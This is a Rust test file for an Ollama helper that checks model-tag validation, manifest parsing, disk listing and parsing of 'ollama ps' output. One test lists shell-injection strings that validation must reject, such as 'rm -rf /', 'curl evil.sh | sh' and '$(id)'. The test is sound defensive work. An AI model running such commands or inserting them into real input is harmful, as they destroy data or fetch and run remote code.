use super::*;

#[test]
fn accepts_the_tag_forms_ollama_uses() {
    for tag in [
        "llama3.2",
        "qwen2.5-coder:7b",
        "deepseek-r1:1.5b",
        "gemma3:270m",
        "mistral:latest",
        "library/llama3.2",
        "my_model-v2:q4_K_M",
    ] {
        assert!(
            validate_model_tag(tag).is_ok(),
            "should have accepted {tag:?}: {:?}",
            validate_model_tag(tag).err()
        );
    }
}

#[test]
fn trims_surrounding_whitespace() {
    assert_eq!(validate_model_tag("  mistral:7b \n").unwrap(), "mistral:7b");
}

#[test]
fn rejects_shell_shaped_input() {
    // This string is handed to a command, so anything that could change the
    // meaning of that command must not survive validation.
    for hostile in [
        "mistral; rm -rf /",
        "mistral && curl evil.sh | sh",
        "mistral`whoami`",
        "mistral$(id)",
        "mistral | tee /etc/passwd",
        "mistral\nrm -rf /",
        "mistral > /dev/sda",
        "$(curl evil)",
        "--flag-shaped",
    ] {
        assert!(
            validate_model_tag(hostile).is_err(),
            "accepted hostile input: {hostile:?}"
        );
    }
}

#[test]
fn rejects_empty_and_absurd_input() {
    assert!(validate_model_tag("").is_err());
    assert!(validate_model_tag("   ").is_err());
    assert!(validate_model_tag(&"a".repeat(200)).is_err());
}

#[test]
fn rejects_malformed_tags() {
    assert!(validate_model_tag(":7b").is_err(), "leading colon");
    assert!(validate_model_tag("a:b:c").is_err(), "two colons");
}

#[test]
fn error_messages_are_actionable() {
    let err = validate_model_tag("").unwrap_err().to_string();
    assert!(
        err.contains("qwen2.5-coder:7b"),
        "empty-input error should show an example, got: {err}"
    );
}

#[test]
fn catalog_source_explains_itself_only_when_degraded() {
    assert!(CatalogSource::Live.note().is_none());
    for degraded in [
        CatalogSource::BundledOffline,
        CatalogSource::BundledMarkupChanged,
    ] {
        let note = degraded
            .note()
            .expect("degraded sources explain themselves");
        assert!(
            note.contains("built-in list"),
            "note should say the list is a fallback: {note}"
        );
    }
}

#[test]
fn binary_resolution_does_not_panic_without_ollama() {
    // Whether it resolves depends on the machine; it must never panic.
    let _ = resolve_binary();
    let _ = is_installed();
}

#[test]
fn reconstructs_model_refs_from_manifest_paths() {
    use std::path::Path;

    // The default registry and the "library" namespace are implicit in the
    // short names Ollama prints, so they're dropped.
    assert_eq!(
        model_ref_from_manifest_path(Path::new("registry.ollama.ai/library/codellama/13b")),
        Some("codellama:13b".to_string())
    );
    assert_eq!(
        model_ref_from_manifest_path(Path::new("registry.ollama.ai/library/deepseek-coder/6.7b")),
        Some("deepseek-coder:6.7b".to_string())
    );
    // A non-library / non-default source keeps its full reference.
    assert_eq!(
        model_ref_from_manifest_path(Path::new("hf.co/user/model/latest")),
        Some("hf.co/user/model:latest".to_string())
    );
    // Too short to be a name+tag.
    assert_eq!(model_ref_from_manifest_path(Path::new("dangling")), None);
}

#[test]
fn lists_installed_models_from_disk_without_a_server() {
    use std::fs;

    let dir = tempfile::tempdir().expect("tempdir");
    let manifests = dir.path().join("manifests/registry.ollama.ai/library");
    fs::create_dir_all(manifests.join("codellama")).unwrap();
    fs::create_dir_all(manifests.join("deepseek-coder")).unwrap();

    // A model's size is the sum of its layers (plus the tiny config blob).
    fs::write(
        manifests.join("codellama/13b"),
        r#"{"config":{"size":530},"layers":[{"size":7365948416},{"size":7020}]}"#,
    )
    .unwrap();
    fs::write(
        manifests.join("deepseek-coder/6.7b"),
        r#"{"config":{"size":483},"layers":[{"size":3827834503}]}"#,
    )
    .unwrap();
    // A malformed manifest is skipped, not fatal.
    fs::write(manifests.join("codellama/broken"), "not json").unwrap();

    let models = list_installed_from_disk(dir.path());

    assert_eq!(models.len(), 2, "two valid manifests: {models:?}");
    // Sorted by name.
    assert_eq!(models[0].name, "codellama:13b");
    assert_eq!(models[0].size_bytes, 530 + 7365948416 + 7020);
    assert_eq!(models[1].name, "deepseek-coder:6.7b");
    assert_eq!(models[1].size_bytes, 483 + 3827834503);
}

#[test]
fn listing_from_a_missing_models_dir_is_empty_not_an_error() {
    let models = list_installed_from_disk(std::path::Path::new("/nonexistent/ollama/models"));
    assert!(models.is_empty());
}

#[test]
fn parses_running_model_names_from_ollama_ps() {
    // Real `ollama ps` output: a header row, then a row per running model.
    let output = "\
NAME                   ID              SIZE      PROCESSOR    UNTIL
codellama:13b          9f438cb9cd58    9.0 GB    100% GPU     4 minutes from now
deepseek-coder:6.7b    ce298d984115    5.5 GB    100% GPU     4 minutes from now
";
    assert_eq!(
        running_model_names(output),
        vec![
            "codellama:13b".to_string(),
            "deepseek-coder:6.7b".to_string()
        ]
    );
}

#[test]
fn nothing_running_yields_no_names() {
    // Header only — the idle state.
    let output = "NAME    ID    SIZE    PROCESSOR    UNTIL\n";
    assert!(running_model_names(output).is_empty());
    // And a totally empty capture.
    assert!(running_model_names("").is_empty());
}
